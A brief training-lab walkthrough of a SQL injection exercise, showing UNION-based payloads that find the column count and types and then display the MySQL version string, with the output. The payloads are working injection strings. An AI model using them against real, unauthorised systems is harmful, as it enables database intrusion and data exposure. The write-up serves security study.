
Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

---

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

1/ Determine the number of columns

```sql
' UNION SELECT NULL--%20
' UNION SELECT NULL, NULL--%20
```


2/ Determine the data type of columns

```sql
' UNION SELECT 'AAA', 'AAA'--%20
```


3/ Determine the type and version of the database

```sql
' UNION SELECT NULL, @@version--%20
```

```text
8.0.42-0ubuntu0.20.04.1
```

Or

```sql
' UNION SELECT NULL, @@version--+
```

```text
8.0.42-0ubuntu0.20.04.1
```

